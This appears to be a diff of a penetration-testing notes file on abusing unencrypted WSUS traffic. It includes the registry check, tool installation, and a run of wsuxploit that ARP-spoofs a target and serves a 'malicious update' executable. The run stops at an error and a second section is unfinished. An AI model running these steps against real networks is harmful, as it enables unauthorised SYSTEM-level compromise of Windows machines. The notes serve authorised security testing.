@@ -2,23 +2,129 @@
 Abusing non-SSL WSUS traffic with wsuxploit
 ============================================================================================================
 
+Scenario
+----------
+During an internal penetration test, you discover that the WSUS traffic in your target network (workstations & servers) uses the HTTP protocol. 
+As a result you can impersonate the WSUS server using a MITM attack and get SYSTEM access to the windows targets inside of the internal (that you can 
+affect with your MITM attack).
+
+
+============================================================================================================
+PoC 1 - Test using the tool wsuxploit
+============================================================================================================
+
 => Source: https://github.com/pimps/wsuxploit
 
 This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic. 
 It is based on the WSUSpect Proxy application that was introduced to public on the Black Hat USA 2015 presentation, 'WSUSpect – Compromising the Windows Enterprise via Windows Update'.
 
 
-Scenario
-----------
-During an internal penetration test, you discover that the WSUS server address of your target network (workstations & servers) uses the HTTP protocol. 
-As a result you can impersonate the WSUS server using a MITM attack and get SYSTEM access to the windows targets inside of the internal (that you can 
-affect with your MITM attack).
-
-
-Step 1 -  You have gain access to a workstation or server and you verify the configuration of WSUS
-============================================================================================================
+Step 1 -  After gaining access to a workstation or server during an internal pentest, check if non-SSL WSUS traffic is enabled
+-------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
     WUServer    REG_SZ    http://192.168.1.12:8535/
+    
+    
+Step 2. Install the tool wsuxploit on a Kali
+------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo apt-get install samba dsniff iptables python3
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+iptables is already the newest version (1.8.8-1).
+iptables set to manually installed.
+python3 is already the newest version (3.10.5-3).
+python3 set to manually installed.
+The following additional packages will be installed:
+  libldb2 libnids1.21 libsmbclient libwbclient0 python3-ldb python3-samba samba-common samba-common-bin samba-dsdb-modules samba-libs samba-vfs-modules smbclient winexe
+Suggested packages:
+  bind9 bind9utils ctdb ldb-tools ntp | chrony smbldap-tools ufw winbind heimdal-clients
+The following NEW packages will be installed:
+  dsniff libnids1.21
+The following packages will be upgraded:
+  libldb2 libsmbclient libwbclient0 python3-ldb python3-samba samba samba-common samba-common-bin samba-dsdb-modules samba-libs samba-vfs-modules smbclient winexe
+13 upgraded, 2 newly installed, 0 to remove and 227 not upgraded.
+Need to get 13.7 MB of archives.
+After this operation, 301 kB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Get:1 http://http.kali.org/kali kali-rolling/main amd64 libsmbclient amd64 2:4.16.4+dfsg-2 [170 kB]
+<snip>
+
+──(kali㉿kali)-[~/Documents]
+└─$ git clone https://github.com/pimps/wsuxploit.git
+Cloning into 'wsuxploit'...
+remote: Enumerating objects: 65, done.
+remote: Total 65 (delta 0), reused 0 (delta 0), pack-reused 65
+Receiving objects: 100% (65/65), 1.42 MiB | 2.05 MiB/s, done.
+Resolving deltas: 100% (26/26), done.
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ cd wsuxploit
+
+┌──(kali㉿kali)-[~/Documents/wsuxploit]
+└─$ git clone https://github.com/ctxis/wsuspect-proxy.git
+Cloning into 'wsuspect-proxy'...
+remote: Enumerating objects: 85, done.
+remote: Total 85 (delta 0), reused 0 (delta 0), pack-reused 85
+Receiving objects: 100% (85/85), 128.99 KiB | 2.93 MiB/s, done.
+Resolving deltas: 100% (39/39), done.
+
+
+Step 3. Run the tool 'wsuxploit' to start a malicious WSUS server on your Kali, then perform a MITM attack (arp poisoning attack)
+        and install malicious updates on the Windows machines of your target network
+----------------------------------------------------------------------------------------------------------------------------------
+                                                                                                                                                                                                                                
+┌──(kali㉿kali)-[~/Documents/wsuxploit]
+└─$ sudo bash wsuxploit.sh 
+ __      __  _____________ _______  ___      .__         .__  __   
+/  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
+\   \/\/   /\_____  \|    |   /\     /\____ \|  |  /  _ \|  \   __\ 
+ \        / /        \    |  / /     \|  |_> >  |_(  <_> )  ||  |  
+  \__/\  / /_______  /______/ /___/\  \   __/|____/\____/|__||__|  
+       \/          \/               \_/__|                         by pimps
+
+Usage:
+wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>
+
+Example:
+wsuxploit.sh 192.168.0.101 10.0.0.85 80 /tmp/payload.exe
+
+
+──(kali㉿kali)-[~/Documents/wsuxploit]
+└─$ sudo bash wsuxploit.sh 192.168.1.53 192.168.1.12 8535 /tmp/maliciousupdate.exe
+[sudo] password for kali: 
+ __      __  _____________ _______  ___      .__         .__  __   
+/  \    /  \/   _____/    |   \   \/  /_____ |  |   ____ |__|/  |_ 
+\   \/\/   /\_____  \|    |   /\     /\____ \|  |  /  _ \|  \   __\ 
+ \        / /        \    |  / /     \|  |_> >  |_(  <_> )  ||  |  
+  \__/\  / /_______  /______/ /___/\  \   __/|____/\____/|__||__|  
+       \/          \/               \_/__|                         by pimps
+
+[*] Preparing exploit files...
+[*] Spoofing arp replies...
+[*] Turning on IP forwarding...
+[*] Set iptables rules for SYN packets...
+[*] Running WSUSpect proxy...
+2022-08-27 02:07:42-0400 [-] Log opened.
+2022-08-27 02:07:42-0400 [-] InterceptingProxyFactory starting on 9090
+2022-08-27 02:07:42-0400 [-] Starting factory <intercepting_proxy.InterceptingProxyFactory object at 0x7f92b4c07040>
+
+2022-08-27 02:13:26-0400 [InterceptingProxy,0,192.168.1.113] Unhandled Error
+        Traceback (most recent call last):
+
+=> I got 'Unhandled Error messages'.
+To complete...
+
+============================================================================================================
+PoC 2 - Test using the tool PyWSUS
+============================================================================================================
+
+=> https://github.com/GoSecure/pywsus
+
+To complete...
+
